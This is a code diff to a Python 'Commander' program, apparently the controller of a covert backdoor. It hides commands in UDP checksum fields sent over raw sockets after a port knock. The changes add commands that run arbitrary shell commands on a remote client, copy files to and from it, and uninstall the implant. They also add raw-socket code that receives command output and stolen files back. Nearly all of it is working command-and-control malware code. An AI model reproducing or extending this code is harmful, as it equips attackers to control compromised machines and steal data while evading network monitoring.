@@ -20,13 +20,11 @@ COMMAND_PORT = 8888  # UDP port for covert channel
 
 class CommandType(IntEnum):
     """Commands encoded in UDP checksum field"""
-    PING = 0x1234
-    SHELL_EXEC = 0x2345
-    READ_FILE = 0x3456
-    WRITE_FILE = 0x4567
-    LIST_DIR = 0x5678
-    SYSINFO = 0x6789
-    DISCONNECT = 0x789A
+    DISCONNECT = 0x1234
+    UNINSTALL = 0x2345
+    TRANSFER_TO_CLIENT = 0x3456
+    TRANSFER_FROM_CLIENT = 0x4567
+    RUN_COMMAND = 0x5678
     ACK = 0x9ABC
     ERROR = 0xABCD
 
@@ -125,6 +123,46 @@ class RawSocketProtocol:
             print(f"[!] Error sending: {e}")
             return False
 
+    def parse_udp_packet(self, packet):
+        """Parse UDP packet and extract covert data"""
+        if len(packet) < 20:
+            return None
+
+        ip_header = packet[:20]
+        iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
+
+        version_ihl = iph[0]
+        ihl = version_ihl & 0xF
+        iph_length = ihl * 4
+
+        protocol = iph[6]
+        src_ip = socket.inet_ntoa(iph[8])
+        dst_ip = socket.inet_ntoa(iph[9])
+
+        if protocol != 17:  # Not UDP
+            return None
+
+        udp_header = packet[iph_length:iph_length + 8]
+        if len(udp_header) < 8:
+            return None
+
+        udph = struct.unpack('!HHHH', udp_header)
+        src_port = udph[0]
+        dst_port = udph[1]
+        udp_length = udph[2]
+        udp_checksum = udph[3]  # COVERT DATA
+
+        payload = packet[iph_length + 8:]
+
+        return {
+            'src_ip': src_ip,
+            'dst_ip': dst_ip,
+            'src_port': src_port,
+            'dst_port': dst_port,
+            'checksum': udp_checksum,
+            'payload': payload
+        }
+
 
 class Commander:
     """
@@ -182,7 +220,7 @@ class Commander:
         print(f"\n[→] Sending covert command: {command_type.name}")
         print(f"    Encoding: UDP checksum = 0x{int(command_type):04X}")
         print(f"    Transport: UDP port {self.command_port}")
-        if payload:
+        if payload and len(payload) < 100:
             preview = payload[:50].decode('utf-8', errors='ignore')
             print(f"    Payload: {preview}")
 
@@ -197,10 +235,75 @@ class Commander:
 
         if success:
             print(f"[✓] Packet sent successfully")
+
+            # For RUN_COMMAND and TRANSFER_FROM_CLIENT, wait for response
+            if command_type in [CommandType.RUN_COMMAND, CommandType.TRANSFER_FROM_CLIENT]:
+                print("[*] Waiting for response...")
+                response = self.receive_response()
+                if response:
+                    self.display_response(response)
         else:
             print(f"[✗] Failed to send packet")
 
         return success
+
+    def receive_response(self, timeout=5):
+        """Receive response from client via covert channel"""
+        try:
+            # Create raw socket to receive UDP packets
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+            sock.settimeout(timeout)
+
+            start_time = time.time()
+            while time.time() - start_time < timeout:
+                try:
+                    packet, addr = sock.recvfrom(65535)
+
+                    # Parse the packet
+                    parsed = self.protocol.parse_udp_packet(packet)
+                    if not parsed:
+                        continue
+
+                    # Check if it's for our port and from target
+                    if parsed['dst_port'] == self.command_port and parsed['src_ip'] == self.target_host:
+                        # Extract response type from checksum
+                        response_type = parsed['checksum']
+                        sock.close()
+                        return {
+                            'type': response_type,
+                            'payload': parsed['payload']
+                        }
+
+                except socket.timeout:
+                    break
+
+            sock.close()
+            print("[!] No response received (timeout)")
+            return None
+
+        except Exception as e:
+            print(f"[!] Error receiving response: {e}")
+            return None
+
+    def display_response(self, response):
+        """Display response from client"""
+        if response['type'] == int(CommandType.ACK):
+            print("\n" + "=" * 60)
+            print("COMMAND OUTPUT:")
+            print("=" * 60)
+            output = response['payload'].decode('utf-8', errors='ignore')
+            if output:
+                print(output)
+            else:
+                print("(no output)")
+            print("=" * 60)
+        elif response['type'] == int(CommandType.ERROR):
+            print("\n" + "=" * 60)
+            print("ERROR:")
+            print("=" * 60)
+            error = response['payload'].decode('utf-8', errors='ignore')
+            print(error)
+            print("=" * 60)
 
     def interactive_session(self):
         """Interactive command session"""
@@ -219,14 +322,13 @@ class Commander:
         print("PHASE 2: Covert Channel Command Interface")
         print("=" * 60)
         print("\nAvailable Commands:")
-        print("  knock             - Re-authenticate via port knock")
-        print("  ping              - Send ping (0x1234)")
-        print("  shell <cmd>       - Execute shell command (0x2345)")
-        print("  read <file>       - Read file (0x3456)")
-        print("  ls [dir]          - List directory (0x5678)")
-        print("  sysinfo           - Get system info (0x6789)")
-        print("  disconnect        - End session (0x789A)")
-        print("  exit              - Exit commander")
+        print("  knock                 - Re-authenticate via port knock")
+        print("  disconnect            - Disconnect from client (0x1234)")
+        print("  uninstall             - Uninstall from client (0x2345)")
+        print("  send <file>           - Transfer file to client (0x3456)")
+        print("  get <file>            - Transfer file from client (0x4567)")
+        print("  run <command>         - Run command on client (0x5678)")
+        print("  exit                  - Exit commander")
         print("=" * 60)
         print()
 
@@ -248,36 +350,45 @@ class Commander:
                 elif cmd == 'knock':
                     self.perform_port_knock()
 
-                elif cmd == 'ping':
-                    self.send_covert_command(CommandType.PING)
-
-                elif cmd == 'shell':
-                    if args:
-                        self.send_covert_command(CommandType.SHELL_EXEC,
-                                                 args.encode('utf-8'))
-                    else:
-                        print("[!] Usage: shell <command>")
-
-                elif cmd == 'read':
-                    if args:
-                        self.send_covert_command(CommandType.READ_FILE,
-                                                 args.encode('utf-8'))
-                    else:
-                        print("[!] Usage: read <filepath>")
-
-                elif cmd == 'ls':
-                    path = args if args else '.'
-                    self.send_covert_command(CommandType.LIST_DIR,
-                                             path.encode('utf-8'))
-
-                elif cmd == 'sysinfo':
-                    self.send_covert_command(CommandType.SYSINFO)
-
                 elif cmd == 'disconnect':
                     self.send_covert_command(CommandType.DISCONNECT)
                     print("\n[*] Disconnect sent - authorization revoked on client")
                     print("[*] Exiting commander...")
                     break
+
+                elif cmd == 'uninstall':
+                    self.send_covert_command(CommandType.UNINSTALL)
+                    print("\n[*] Uninstall command sent")
+                    print("[*] Client will clean up and terminate")
+
+                elif cmd == 'send':
+                    if args:
+                        # Read local file and send to client
+                        try:
+                            with open(args, 'rb') as f:
+                                filedata = f.read()
+                            filename = args.split('/')[-1]  # Get filename
+                            # Format: filename|filedata
+                            payload = f"{filename}|".encode('utf-8') + filedata
+                            self.send_covert_command(CommandType.TRANSFER_TO_CLIENT, payload)
+                        except Exception as e:
+                            print(f"[!] Error reading file: {e}")
+                    else:
+                        print("[!] Usage: send <filepath>")
+
+                elif cmd == 'get':
+                    if args:
+                        self.send_covert_command(CommandType.TRANSFER_FROM_CLIENT,
+                                                 args.encode('utf-8'))
+                    else:
+                        print("[!] Usage: get <filepath>")
+
+                elif cmd == 'run':
+                    if args:
+                        self.send_covert_command(CommandType.RUN_COMMAND,
+                                                 args.encode('utf-8'))
+                    else:
+                        print("[!] Usage: run <command>")
 
                 else:
                     print(f"[!] Unknown command: {cmd}")
